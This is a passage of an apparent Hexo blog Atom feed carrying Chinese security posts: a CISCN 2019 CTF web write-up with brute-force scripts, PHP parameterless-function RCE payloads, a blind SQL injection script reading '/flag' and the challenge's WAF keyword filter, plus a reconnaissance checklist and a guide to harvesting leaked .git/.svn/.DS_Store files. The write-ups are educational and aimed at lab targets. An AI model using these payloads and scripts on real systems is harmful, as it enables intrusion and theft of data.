<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>peri0d的博客</title>
  
  <subtitle>peri0d</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-06-27T08:36:02.218Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>peri0d</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019CISCN华南线下两道web复现</title>
    <link href="http://yoursite.com/2019/06/25/2019CISCN%E5%8D%8E%E5%8D%97%E7%BA%BF%E4%B8%8B%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/06/25/2019CISCN华南线下部分web复现/</id>
    <published>2019-06-25T14:43:09.680Z</published>
    <updated>2019-06-27T08:36:02.218Z</updated>
    
    <content type="html"><![CDATA[<p>部分题目下载地址，有的不完整 : <a href="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn.zip" target="_blank" rel="noopener">点我点我</a></p><h1 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h1><ul><li><p>考点 : 无参函数的 RCE</p></li><li><p>在注释中发现了 forgetpassword.php 页面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1.png" alt></p></li><li><p>打开 forgetpassword.php，要求输入一个用户名，尝试用户名爆破，结果为 <code>admin123</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/ciscn/web1/useri.php"</span></span><br><span class="line"></span><br><span class="line">response = <span class="string">"没有这个用户"</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./username.txt"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">line = line.strip()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"user_name"</span> : line,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(line)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>输入 admin123 之后跳转到 useryzm.php 页面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_2.png" alt></p></li><li><p>提示验证码经过 base64 加密，而且验证码是 4 位的数字，写脚本爆破一下，结果验证码为 <code>MTQyMw==</code></p><p>四位数字生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">s = str(i).zfill(<span class="number">4</span>)</span><br><span class="line">print(s)</span><br><span class="line">f = open(<span class="string">"num.txt"</span>,<span class="string">'a'</span>)</span><br><span class="line">f.write(s)</span><br><span class="line">f.write(<span class="string">'\n'</span>)   <span class="comment">#实现换行的功能</span></span><br></pre></td></tr></table></figure><p>爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1/ciscn/web1/yzmi.php'</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./num.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">response = <span class="string">"错误"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">line = line.strip().encode(<span class="string">'utf-8'</span>)</span><br><span class="line">line = base64.b64encode(line)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"yzm"</span> : line.decode(<span class="string">'utf-8'</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(line)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>输入后获得密码 <code>f4h1l0t0j2g5b1m0a0m0a3d2d0</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_3.png" alt></p></li><li><p>返回 index.html 输入账号密码，获得新提示，但是这里忘记复制数据库了，就直接跳到下一步吧，访问 mDjNaF.php</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_4.png" alt></p></li><li><p>mDjNaF.php 页面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_5.png" alt></p></li><li><p>看一下正则，<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code>，<code>\W</code> 匹配任意字母和数字，<code>(?R)?</code> 重复整个模式，合在一起类似于匹配 <code>x(y(z()))</code> 样式的，且不能存在参数，输入 <code>phpinfo();</code> 可以查看 phpinfo 页面</p></li><li><p>接下来就是构造无参数函数进行 RCE 了，想到可以<strong>更改 header 中的属性和值</strong>，使用无参数函数获取 header 处的值，达到 RCE 的目的。</p></li><li><p>对于 Cookie 属性，我们可以随意更改，session_id() 函数可以获取 PHPSESSID，如果没有开启 session 可以使用 session_start() 函数。由于不能带参数，我们可以将命令转化为 hex 再用 hex2bin() 函数转化。</p></li><li><p>payload : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(hex2bin(session_id(session_start())));</span><br><span class="line"><span class="comment">// echo 'peri0d';</span></span><br><span class="line">Cookie: PHPSESSID=<span class="number">6563686</span>f2027706572693064273b</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_6.png" alt></p></li><li><p>还可以自己传参达到 RCE，get_defined_vars() 函数返回所有已定义的变量列表，然后利用提取位置的函数就可以实现 RCE</p></li><li><p>payload : <code>?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir(&#39;../&#39;))</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_7.png" alt></p></li></ul><h1 id="web-4"><a href="#web-4" class="headerlink" title="web 4"></a>web 4</h1><ul><li><p>考点 : insert() 盲注</p></li><li><p>一个登录页面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_1.png" alt></p></li><li><p>试一试万能密码 <code>admin&#39;#</code> ，登录成功，并给出提示</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_2.png" alt></p></li><li><p>经过 fuzz 发现过滤了空格，union，benchmark，sleep，regexp，order等很多很多关键字，空格可以使用 /**/ 绕过</p></li><li><p>给出了文件路径，可以使用 load_file 读取，再与 insert() 函数结合，使用异或，好像可以进行盲注</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_3.png" alt></p></li><li><p><code>insert((select(load_file(&#39;/flag&#39;))),2,255,&#39;&#39;)</code> 即在 flag 中，从第 2 个字符到第 255 个字符替换为空字符，即只显示第 1 个字符。<code>insert((select(load_file(&#39;/flag&#39;))),3,255,&#39;&#39;)</code>把第 3 个字符到第 255 个字符替换为空字符，即只显示前面两个字符。</p></li><li><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://172.27.137.145/ciscn/web4/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "admin'^(select('f')&gt;(insert((select(load_file('/flag'))),2,255,'')))#"</span></span><br><span class="line"></span><br><span class="line">temp_list = []</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">255</span>):</span><br><span class="line">payload_1 = <span class="string">"')&gt;(insert((select(load_file('/flag'))),"</span>+str(i)+<span class="string">",255,'')))#"</span></span><br><span class="line">flag = <span class="string">''</span>.join(flag_list)</span><br><span class="line">temp_list.clear()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">payload = <span class="string">"admin'^(select('"</span>+flag+chr(j)+payload_1</span><br><span class="line">print(payload)</span><br><span class="line">data = &#123;<span class="string">'username'</span> : payload,&#125;</span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">temp_list.append(chr(j))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">flag_list.append(temp_list.pop())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">''</span>.join(flag_list))</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_4.png" alt></p></li><li><p>过滤语句 : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|benchmark|strcmp|locate|STRCMP|position|md5|mid|sub|concat|and|left|sleep|space|instr|conv|\s|right|cast|locate|limit|reverse|glob|having|match|count|pad|char|hex|regexp|order|group|ascii|information/i"</span>,$username))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|position|strcmp|locate|benchmark|STRCMP|concat|md5|mid|sub|sleep|and|left|cast|space|instr|pad|conv|\s|right|limit|reverse|locate|match|glob|having|count|char|hex|regexp|order|group|ascii|information/i"</span>,$passwd))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;部分题目下载地址，有的不完整 : &lt;a href=&quot;https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="CISCN" scheme="http://yoursite.com/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>信息搜集</title>
    <link href="http://yoursite.com/2019/06/25/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://yoursite.com/2019/06/25/信息搜集/</id>
    <published>2019-06-25T13:23:30.117Z</published>
    <updated>2019-06-25T14:15:27.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息搜集的流程"><a href="#信息搜集的流程" class="headerlink" title="信息搜集的流程"></a>信息搜集的流程</h1><ul><li>域名：whois, 子域名, 备案信息</li><li>服务器 : dns 信息, 端口信息, 真实 IP</li><li>web : 网站架构, 敏感目录及敏感信息, 源码泄露, 旁站查询, C 段查询, 指纹系统, 探测 waf</li><li>企业 : 天眼, 维基</li></ul><h1 id="whois-查询"><a href="#whois-查询" class="headerlink" title="whois 查询"></a>whois 查询</h1><ul><li>直接进行 whois 查询</li><li>到微步查询询历史whois，可以获取到历史的whois信息</li><li>反查whois，获取该注册者/电话/邮箱下的相关域名</li></ul><h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><ul><li><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li><li><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></li><li><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></li></ul><h1 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h1><ul><li>ICP 查询</li><li>公安部备案查询</li></ul><p>urls.txt 传入需要查询的网站</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">targets = []</span><br><span class="line">names = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icp_info</span><span class="params">(host)</span>:</span></span><br><span class="line">url = <span class="string">"https://icp.chinaz.com/ajaxsync.aspx?at=beiansl&amp;callback=jQuery111305329118231795913_1554378576520&amp;host=%s&amp;type=host"</span>%host</span><br><span class="line">html = requests.get(url,timeout=(<span class="number">5</span>,<span class="number">10</span>)).text</span><br><span class="line">pattern = re.compile(<span class="string">'SiteName:"(.*?)",MainPage:"(.*?)"'</span>,re.S)</span><br><span class="line">info = re.findall(pattern,html)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">name = info[i][<span class="number">0</span>]</span><br><span class="line">target = info[i][<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"%s:%s"</span>%(name,target))</span><br><span class="line"><span class="keyword">if</span> target <span class="keyword">not</span> <span class="keyword">in</span> targets:</span><br><span class="line">targets.append(target)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"icp_info.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="string">"%s:%s"</span>%(name,target) + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"url.txt"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> a:</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> a:</span><br><span class="line">b = b.strip()</span><br><span class="line">icp_info(host=b)</span><br><span class="line">a.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">thread = threading.Thread(target=start,)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="DNS-信息查询"><a href="#DNS-信息查询" class="headerlink" title="DNS 信息查询"></a>DNS 信息查询</h1><ul><li><a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a></li><li><a href="https://tool.lu/dns/" target="_blank" rel="noopener">https://tool.lu/dns/</a></li></ul><h1 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h1><ul><li>Nmap</li></ul><h1 id="获取真实-IP"><a href="#获取真实-IP" class="headerlink" title="获取真实 IP"></a>获取真实 IP</h1><h1 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><ul><li>云悉</li><li>Nmap</li></ul><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><ul><li>云悉</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li>云悉</li></ul><h2 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h2><ul><li>云悉</li></ul><h1 id="敏感目录及敏感信息"><a href="#敏感目录及敏感信息" class="headerlink" title="敏感目录及敏感信息"></a>敏感目录及敏感信息</h1><ul><li><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></li><li><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a></li><li>御剑</li></ul><h1 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h1><h1 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h1><ul><li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li></ul><h1 id="C-段查询"><a href="#C-段查询" class="headerlink" title="C 段查询"></a>C 段查询</h1><ul><li>Nmap</li><li>北极熊扫描器扫</li></ul><h1 id="指纹系统"><a href="#指纹系统" class="headerlink" title="指纹系统"></a>指纹系统</h1><ul><li>云悉</li></ul><h1 id="探测-waf"><a href="#探测-waf" class="headerlink" title="探测 waf"></a>探测 waf</h1><ul><li>Nmap</li></ul><h1 id="网站资产"><a href="#网站资产" class="headerlink" title="网站资产"></a>网站资产</h1><ul><li>天眼</li><li>维基</li><li>shodan/zoomeye/fofa</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;信息搜集的流程&quot;&gt;&lt;a href=&quot;#信息搜集的流程&quot; class=&quot;headerlink&quot; title=&quot;信息搜集的流程&quot;&gt;&lt;/a&gt;信息搜集的流程&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;域名：whois, 子域名, 备案信息&lt;/li&gt;
&lt;li&gt;服务器 : dns 信息, 端
      
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="信息搜集" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
    
      <category term="源码泄露" scheme="http://yoursite.com/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
      <category term="whois" scheme="http://yoursite.com/tags/whois/"/>
    
      <category term="子域名" scheme="http://yoursite.com/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/"/>
    
      <category term="信息搜集" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>常见源码泄露</title>
    <link href="http://yoursite.com/2019/06/19/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>http://yoursite.com/2019/06/19/源码泄露/</id>
    <published>2019-06-18T17:08:12.605Z</published>
    <updated>2019-06-18T17:24:25.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hg"><a href="#hg" class="headerlink" title=".hg"></a>.hg</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>hg init 的时候生成 .hg</p><p>例如，<a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>使用 dvcs-ripper</p><p>rip-hg.pl -v -u <a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a></p><h1 id="git"><a href="#git" class="headerlink" title=".git"></a>.git</h1><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><p>当在一个目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了。</p><p>例如，<a href="http://www.example.com/.git/" target="_blank" rel="noopener">http://www.example.com/.git/</a></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>使用 GitHack</p><p>python GitHack.py <a href="http://www.example.com/.git/" target="_blank" rel="noopener">http://www.example.com/.git/</a></p><h1 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h1><h2 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h2><p>.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。</p><p>这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。</p><p>因为里面包含了一些目录信息，如果没有删除，攻击者通过 .DS_Store 可以知道这个目录里面所有文件名称，从而让攻击者掌握了更多的信息。　</p><p>在发布代码时未删除文件夹中隐藏的 .DS_store，被发现后，获取了敏感的文件名等信息。</p><p>例如，<a href="http://www.example.com/.DS_Store" target="_blank" rel="noopener">http://www.example.com/.DS_Store</a></p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>使用 ds_store_exp</p><p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store" target="_blank" rel="noopener">http://www.example.com/.DS_Store</a></p><h1 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h1><h2 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h2><p>网站备份时，未安全存储备份文件</p><p>常见格式：</p><ul><li>.rar</li><li>.zip</li><li>.7z</li><li>.tar.gz</li><li>.bak</li><li>.swp</li><li>.txt</li><li>.html</li><li><a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></li><li>url.tar.gz</li></ul><p>比如，<a href="http://wm123.baidu.com/wm123.tar.gz" target="_blank" rel="noopener">http://wm123.baidu.com/wm123.tar.gz</a></p><h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><p>直接访问下载</p><h1 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h1><h2 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h2><p>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。</p><p>很多网站都使用了 svn 版本控制系统，和使用 git 版本控制器类似，很多开发者网站安全意识不足，代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留。</p><p>例如，<a href="http://www.example.com/.svn" target="_blank" rel="noopener">http://www.example.com/.svn</a></p><h2 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h2><p>使用 dvcs-ripper</p><p>rip-svn.pl -v -u <a href="http://www.example.com/.svn" target="_blank" rel="noopener">http://www.example.com/.svn</a></p><h1 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h1><h2 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h2><p>WEB-INF 是 Java 的 WEB 应用的安全目录。该目录原则上来说是客户端无法访问，只有服务端才可以可以访问。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF 主要包含一下文件或目录：</p><ul><li>/WEB-INF/web.xml：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</li><li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 .jar 文件中</li><li>/WEB-INF/lib/：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件 , 如数据库驱动 jar 文件</li><li>/WEB-INF/src/：源码目录，按照包名结构放置各个 java 文件</li><li>/WEB-INF/database.properties：数据库配置文件</li></ul><p>在一些特定的场合却会让攻击者能读取到其中的内容，从而造成源码泄露</p><h2 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h2><p>直接访问</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;hg&quot;&gt;&lt;a href=&quot;#hg&quot; class=&quot;headerlink&quot; title=&quot;.hg&quot;&gt;&lt;/a&gt;.hg&lt;/h1&gt;&lt;h2 id=&quot;成因&quot;&gt;&lt;a href=&quot;#成因&quot; class=&quot;headerlink&quot; title=&quot;成因&quot;&gt;&lt;/a&gt;成因&lt;/h2&gt;&lt;p&gt;h
      
    
    </summary>
    
      <category term="源码泄露" scheme="http://yoursite.com/categories/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
    
      <category term="源码泄露" scheme="http://yoursite.com/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>常见漏洞总结</title>
    <link href="http://yoursite.com/2019/06/14/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/06/14/漏洞总结/</id>
    <published>2019-06-14T13:59:48.426Z</published>
    <updated>2019-06-19T17:40:43.513Z</updated>
    
